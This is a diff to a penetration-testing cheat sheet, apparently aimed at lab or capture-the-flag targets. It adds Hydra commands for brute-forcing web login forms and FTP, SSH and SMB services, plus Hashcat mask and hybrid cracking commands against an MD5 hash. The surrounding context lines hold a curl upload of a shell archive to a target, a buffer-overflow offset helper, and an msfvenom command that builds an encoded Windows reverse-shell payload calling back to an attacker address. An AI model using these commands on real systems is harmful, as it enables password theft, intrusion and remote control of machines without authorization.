@@ -109,6 +109,28 @@ curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
 ```
 
+#### Cracking Passwords
+
+##### Cracking Web Forms with Hydra
+```bash
+hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list 
+````
+
+##### Cracking Common Protocols with Hydra
+```bash
+hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
+````
+
+##### HashCat Cracking
+```bash
+# Bruteforce based on the pattern;
+hashcat -a3 -m0 "e99a18c428cb38d5f260853678922e03" ?l?l?l?d?d?d --force  
+ 
+# Generate Password candidates: wordlist + pattern 
+hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable –stdout 
+```
+
+
 #### Generating Payload with msfvenom
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
